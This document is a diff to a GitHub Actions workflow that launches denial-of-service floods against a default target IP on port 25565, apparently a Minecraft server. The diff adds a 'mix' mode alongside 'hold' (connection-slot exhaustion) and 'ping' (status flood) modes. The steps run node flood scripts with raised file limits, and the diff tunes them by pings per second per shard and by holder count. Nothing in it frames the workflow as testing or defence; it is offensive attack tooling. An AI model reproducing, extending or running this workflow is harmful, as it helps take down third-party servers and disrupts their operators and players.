@@ -4,19 +4,22 @@ on:
   workflow_dispatch:
     inputs:
       mode:
-        description: 'hold = slot exhaustion, ping = status flood'
+        description: 'mix = ping+hold, hold = slots only, ping = status only'
         type: choice
-        options: [hold, ping]
-        default: hold
+        options: [mix, hold, ping]
+        default: mix
       host:
         description: 'target IP'
         default: '4.247.219.170'
       port:
         description: 'target port'
         default: '25565'
+      rate:
+        description: 'pings per second per shard (mix: 400, ping: 400, hold: ignored)'
+        default: '400'
       conc:
-        description: 'connections per shard (hold: 1500, ping: 400)'
-        default: '1500'
+        description: 'holder count (hold mode only)'
+        default: '200'
 
 jobs:
   flood:
@@ -33,9 +36,12 @@ jobs:
       - uses: actions/setup-node@v4
         with:
           node-version: 22
-      - name: run hold flood
+      - name: mix
+        if: inputs.mode == 'mix'
+        run: ulimit -n 65535; node mix.js ${{ inputs.host }} ${{ inputs.port }} ${{ inputs.rate }}
+      - name: hold
         if: inputs.mode == 'hold'
         run: ulimit -n 65535; node loginflood.js ${{ inputs.host }} ${{ inputs.port }} ${{ inputs.conc }}
-      - name: run ping flood
+      - name: ping
         if: inputs.mode == 'ping'
-        run: ulimit -n 65535; node pingflood.js ${{ inputs.host }} ${{ inputs.port }} ${{ inputs.conc }}
+        run: ulimit -n 65535; node pingflood.js ${{ inputs.host }} ${{ inputs.port }} ${{ inputs.rate }}
